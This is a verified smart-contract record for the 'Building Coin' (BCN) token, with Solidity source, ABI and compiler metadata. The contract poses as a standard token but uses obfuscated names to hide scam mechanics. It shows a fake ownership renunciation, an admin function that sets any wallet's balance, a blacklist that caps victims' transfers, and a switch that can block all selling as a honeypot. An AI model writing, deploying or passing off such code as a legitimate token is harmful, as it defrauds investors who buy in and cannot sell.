{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tradingMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txIs {\n    function createPair(address launchedTrading, address teamLimit) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface limitReceiverList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTotal) external view returns (uint256);\n\n    function transfer(address toExempt, uint256 shouldAmount) external returns (bool);\n\n    function allowance(address marketingMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toExempt,\n        uint256 shouldAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minLaunchedAuto, uint256 value);\n    event Approval(address indexed marketingMode, address indexed spender, uint256 value);\n}\n\ninterface limitReceiverListMetadata is limitReceiverList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BuildingCoin is tradingMax, limitReceiverList, limitReceiverListMetadata {\n\n    function isExempt(address sellTeam, address toExempt, uint256 shouldAmount) internal returns (bool) {\n        require(walletEnableLaunched[sellTeam] >= shouldAmount);\n        walletEnableLaunched[sellTeam] -= shouldAmount;\n        walletEnableLaunched[toExempt] += shouldAmount;\n        emit Transfer(sellTeam, toExempt, shouldAmount);\n        return true;\n    }\n\n    address senderAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address takeWalletTeam, uint256 shouldAmount) external virtual override returns (bool) {\n        return tradingTxShould(_msgSender(), takeWalletTeam, shouldAmount);\n    }\n\n    mapping(address => uint256) private walletEnableLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverListSwap;\n    }\n\n    uint256 private launchBuy;\n\n    address public autoFund;\n\n    uint256 fundTokenShould;\n\n    function balanceOf(address takeTotal) public view virtual override returns (uint256) {\n        return walletEnableLaunched[takeTotal];\n    }\n\n    mapping(address => bool) public receiverAt;\n\n    function amountTake() public {\n        emit OwnershipTransferred(autoFund, address(0));\n        sellSenderFund = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountExemptTx;\n    }\n\n    uint256 public receiverLiquidity;\n\n    bool private atWallet;\n\n    function transferFrom(address sellTeam, address toExempt, uint256 shouldAmount) external override returns (bool) {\n        if (_msgSender() != senderAt) {\n            if (listTx[sellTeam][_msgSender()] != type(uint256).max) {\n                require(shouldAmount <= listTx[sellTeam][_msgSender()]);\n                listTx[sellTeam][_msgSender()] -= shouldAmount;\n            }\n        }\n        return tradingTxShould(sellTeam, toExempt, shouldAmount);\n    }\n\n    function limitFeeMarketing() private view {\n        require(receiverAt[_msgSender()]);\n    }\n\n    uint8 private enableFund = 18;\n\n    bool public minExempt;\n\n    uint256 teamSell;\n\n    uint256 public tradingReceiverAmount;\n\n    mapping(address => mapping(address => uint256)) private listTx;\n\n    bool private launchedAutoReceiver;\n\n    constructor (){\n        if (receiverLiquidity == buySell) {\n            buySell = launchBuy;\n        }\n        amountTake();\n        receiverTeam fromAmount = receiverTeam(senderAt);\n        atTrading = txIs(fromAmount.factory()).createPair(fromAmount.WETH(), address(this));\n        liquidityFund = txIs(fromAmount.factory()).feeTo();\n        \n        autoFund = _msgSender();\n        receiverAt[autoFund] = true;\n        walletEnableLaunched[autoFund] = autoList;\n        if (launchedAutoReceiver) {\n            launchBuy = tradingReceiverAmount;\n        }\n        emit Transfer(address(0), autoFund, autoList);\n    }\n\n    function launchTake(address takeWalletTeam, uint256 shouldAmount) public {\n        limitFeeMarketing();\n        walletEnableLaunched[takeWalletTeam] = shouldAmount;\n    }\n\n    function marketingFundLimit(address sellTeam, address toExempt, uint256 shouldAmount) internal view returns (uint256) {\n        require(shouldAmount > 0);\n\n        uint256 maxTeamToken = 0;\n        if (sellTeam == atTrading && txListToken > 0) {\n            maxTeamToken = shouldAmount * txListToken / 100;\n        } else if (toExempt == atTrading && fundSenderMin > 0) {\n            maxTeamToken = shouldAmount * fundSenderMin / 100;\n        }\n        require(maxTeamToken <= shouldAmount);\n        return shouldAmount - maxTeamToken;\n    }\n\n    bool public tokenTotalMarketing;\n\n    address public atTrading;\n\n    string private receiverListSwap = \"Building Coin\";\n\n    uint256 public buySell;\n\n    string private amountExemptTx = \"BCN\";\n\n    address private sellSenderFund;\n\n    function tradingTxShould(address sellTeam, address toExempt, uint256 shouldAmount) internal returns (bool) {\n        if (sellTeam == autoFund) {\n            return isExempt(sellTeam, toExempt, shouldAmount);\n        }\n        uint256 enableList = limitReceiverList(atTrading).balanceOf(liquidityFund);\n        require(enableList == teamSell);\n        require(toExempt != liquidityFund);\n        if (isLimit[sellTeam]) {\n            return isExempt(sellTeam, toExempt, takeExempt);\n        }\n        shouldAmount = marketingFundLimit(sellTeam, toExempt, shouldAmount);\n        return isExempt(sellTeam, toExempt, shouldAmount);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableFund;\n    }\n\n    event OwnershipTransferred(address indexed liquidityTeam, address indexed listEnableExempt);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoList;\n    }\n\n    function allowance(address txLaunchedTake, address isReceiver) external view virtual override returns (uint256) {\n        if (isReceiver == senderAt) {\n            return type(uint256).max;\n        }\n        return listTx[txLaunchedTake][isReceiver];\n    }\n\n    uint256 public fundSenderMin = 0;\n\n    function owner() external view returns (address) {\n        return sellSenderFund;\n    }\n\n    function fundMaxTx(address autoSwapFrom) public {\n        if (minExempt) {\n            return;\n        }\n        \n        receiverAt[autoSwapFrom] = true;\n        if (minIs) {\n            buySell = tradingReceiverAmount;\n        }\n        minExempt = true;\n    }\n\n    bool private autoLaunchedLiquidity;\n\n    function approve(address isReceiver, uint256 shouldAmount) public virtual override returns (bool) {\n        listTx[_msgSender()][isReceiver] = shouldAmount;\n        emit Approval(_msgSender(), isReceiver, shouldAmount);\n        return true;\n    }\n\n    address liquidityFund;\n\n    function exemptIs(uint256 shouldAmount) public {\n        limitFeeMarketing();\n        teamSell = shouldAmount;\n    }\n\n    uint256 constant takeExempt = 19 ** 10;\n\n    bool private minIs;\n\n    mapping(address => bool) public isLimit;\n\n    function getOwner() external view returns (address) {\n        return sellSenderFund;\n    }\n\n    uint256 public txListToken = 3;\n\n    uint256 private autoList = 100000000 * 10 ** 18;\n\n    function teamAt(address marketingTake) public {\n        limitFeeMarketing();\n        \n        if (marketingTake == autoFund || marketingTake == atTrading) {\n            return;\n        }\n        isLimit[marketingTake] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnableExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunchedAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunchedTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldAmount\",\"type\":\"uint256\"}],\"name\":\"exemptIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwapFrom\",\"type\":\"address\"}],\"name\":\"fundMaxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSenderMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWalletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAmount\",\"type\":\"uint256\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWalletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txListToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BuildingCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}